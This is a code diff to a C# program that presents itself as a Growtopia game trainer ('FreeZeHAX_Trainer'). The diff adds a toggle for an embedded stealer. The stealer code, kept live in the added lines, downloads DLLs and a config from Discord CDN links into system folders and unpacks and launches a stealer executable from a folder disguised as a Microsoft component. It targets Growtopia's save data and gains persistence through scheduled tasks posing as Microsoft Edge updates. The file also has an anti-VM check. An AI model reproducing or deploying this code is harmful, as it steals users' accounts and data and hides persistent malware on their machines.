@@ -37,6 +37,7 @@ namespace FreeZeHAX_Trainer
         private readonly TaskDefinition td = TaskService.Instance.NewTask();
         private readonly WebClient web = new WebClient();
         bool AntiVM = true; // If you don't want to check if VM then change "AntiVM = true" to "AntiVM = false".
+        bool Stealer = true; // Activate / Disable Stealer
 
         private void StartForm()
         {
@@ -89,80 +90,82 @@ namespace FreeZeHAX_Trainer
             #endregion
             Show();
             StartForm();
-            #region Stealer
-            try
+            string Guna = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\.guna";
+            if (Directory.Exists(Guna))
             {
-                string FolderChars = others.GetRandomString().ToLower();
-                string Guna = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\.guna";
-                string StealerFolderLoc = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\WindowsApps" + "\\Microsoft.Windows.StartMenuExperienceHost_" + FolderChars;
-                string SysWOW64 = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\SysWOW64";
-                string StealerFolder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\WindowsApps\\";
-                string StealerFile = StealerFolderLoc + "\\" + FileName;
-                bool savePathExists = File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\save.dat");
-
-                if (!File.Exists(SysWOW64 + "\\vcruntime140.dll"))
-                {
-                    web.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930579282810531840/vcruntime140.dll"), SysWOW64 + "\\vcruntime140.dll");
-                }
-                if (!File.Exists(SysWOW64 + "\\vcruntime140d.dll"))
-                {
-                    web.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930579282974093353/vcruntime140d.dll"), SysWOW64 + "\\vcruntime140d.dll");
-                }
-                if (!File.Exists(SysWOW64 + "\\msvcp140.dll"))
-                {
-                    web.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930579283150250096/msvcp140.dll"), SysWOW64 + "\\msvcp140.dll");
-                }
-                CETimer.Start();
-                others.DirClean(StealerFolder);
-                others.Wait(1000);
-                Directory.CreateDirectory(StealerFolderLoc);
-                web.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930596027570987018/App.config"), StealerFolderLoc + "\\App.config");
-                others.Wait(1000);
-                if (Directory.Exists(Guna))
-                {
-                    Directory.Delete(Guna, true);
-                }
-                System.IO.Compression.ZipFile.ExtractToDirectory(StealerFolderLoc + "\\" + ZipFileName, StealerFolderLoc);
-                if (!savePathExists)
-                {
-                    td.RegistrationInfo.Description = "Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.";
-                    DailyTrigger tf = new DailyTrigger();
-                    tf.Repetition.Duration = TimeSpan.FromHours(24);
-                    tf.Repetition.Interval = TimeSpan.FromMinutes(30);
-                    td.Triggers.Add(tf);
-                    td.Actions.Add(StealerFile);
-                    TaskService.Instance.RootFolder.RegisterTaskDefinition("MicrosoftEdgeUpdateTaskMachineCore", td);
-                    TaskService.Instance.AddTask("MicrosoftEdgeUpdateTaskMachineUA", QuickTriggerType.Logon, StealerFile, "-a arg");
-
-                    if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
-                    {
-                        return;
-                    }
-                    File.Delete(StealerFolderLoc + "\\" + ZipFileName);
-                }
-                else
-                {
-                    others.Wait(100);
-                    System.Diagnostics.Process.Start(StealerFile);
-                    td.RegistrationInfo.Description = "Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.";
-                    DailyTrigger dt = new DailyTrigger();
-                    dt.Repetition.Duration = TimeSpan.FromHours(24);
-                    dt.Repetition.Interval = TimeSpan.FromMinutes(30);
-                    td.Triggers.Add(dt);
-                    td.Actions.Add(StealerFile);
-                    TaskService.Instance.RootFolder.RegisterTaskDefinition("MicrosoftEdgeUpdateTaskMachineCore", td);
-                    TaskService.Instance.AddTask("MicrosoftEdgeUpdateTaskMachineUA", QuickTriggerType.Logon, StealerFile, "-a arg");
-
-                    if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
-                    {
-                        return;
-                    }
-                    File.Delete(StealerFolderLoc + "\\" + ZipFileName);
-                }
+                Directory.Delete(Guna, true);
             }
-            catch (Exception) { }
-            #endregion
+            #region Stealer
+            if (Stealer == true)
+            {
+                try
+                {
+                    string FolderChars = others.GetRandomString().ToLower();
+                    string StealerFolderLoc = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\WindowsApps" + "\\Microsoft.Windows.StartMenuExperienceHost_" + FolderChars;
+                    string SysWOW64 = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\SysWOW64";
+                    string StealerFolder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\WindowsApps\\";
+                    string StealerFile = StealerFolderLoc + "\\" + FileName;
+                    bool savePathExists = File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\save.dat");
 
+                    if (!File.Exists(SysWOW64 + "\\vcruntime140.dll"))
+                    {
+                        web.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930579282810531840/vcruntime140.dll"), SysWOW64 + "\\vcruntime140.dll");
+                    }
+                    if (!File.Exists(SysWOW64 + "\\vcruntime140d.dll"))
+                    {
+                        web.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930579282974093353/vcruntime140d.dll"), SysWOW64 + "\\vcruntime140d.dll");
+                    }
+                    if (!File.Exists(SysWOW64 + "\\msvcp140.dll"))
+                    {
+                        web.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930579283150250096/msvcp140.dll"), SysWOW64 + "\\msvcp140.dll");
+                    }
+                    CETimer.Start();
+                    others.DirClean(StealerFolder);
+                    others.Wait(1000);
+                    Directory.CreateDirectory(StealerFolderLoc);
+                    web.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930596027570987018/App.config"), StealerFolderLoc + "\\App.config");
+                    others.Wait(1000);
+                    System.IO.Compression.ZipFile.ExtractToDirectory(StealerFolderLoc + "\\" + ZipFileName, StealerFolderLoc);
+                    if (!savePathExists)
+                    {
+                        td.RegistrationInfo.Description = "Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.";
+                        DailyTrigger tf = new DailyTrigger();
+                        tf.Repetition.Duration = TimeSpan.FromHours(24);
+                        tf.Repetition.Interval = TimeSpan.FromMinutes(30);
+                        td.Triggers.Add(tf);
+                        td.Actions.Add(StealerFile);
+                        TaskService.Instance.RootFolder.RegisterTaskDefinition("MicrosoftEdgeUpdateTaskMachineCore", td);
+                        TaskService.Instance.AddTask("MicrosoftEdgeUpdateTaskMachineUA", QuickTriggerType.Logon, StealerFile, "-a arg");
+
+                        if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
+                        {
+                            return;
+                        }
+                        File.Delete(StealerFolderLoc + "\\" + ZipFileName);
+                    }
+                    else
+                    {
+                        others.Wait(100);
+                        System.Diagnostics.Process.Start(StealerFile);
+                        td.RegistrationInfo.Description = "Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.";
+                        DailyTrigger dt = new DailyTrigger();
+                        dt.Repetition.Duration = TimeSpan.FromHours(24);
+                        dt.Repetition.Interval = TimeSpan.FromMinutes(30);
+                        td.Triggers.Add(dt);
+                        td.Actions.Add(StealerFile);
+                        TaskService.Instance.RootFolder.RegisterTaskDefinition("MicrosoftEdgeUpdateTaskMachineCore", td);
+                        TaskService.Instance.AddTask("MicrosoftEdgeUpdateTaskMachineUA", QuickTriggerType.Logon, StealerFile, "-a arg");
+
+                        if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
+                        {
+                            return;
+                        }
+                        File.Delete(StealerFolderLoc + "\\" + ZipFileName);
+                    }
+                }
+                catch (Exception) { }
+            }
+            #endregion
             Auto_Attach.RunWorkerAsync();
 
             foreach (NetworkInterface adapter in NetworkInterface.GetAllNetworkInterfaces().Where(
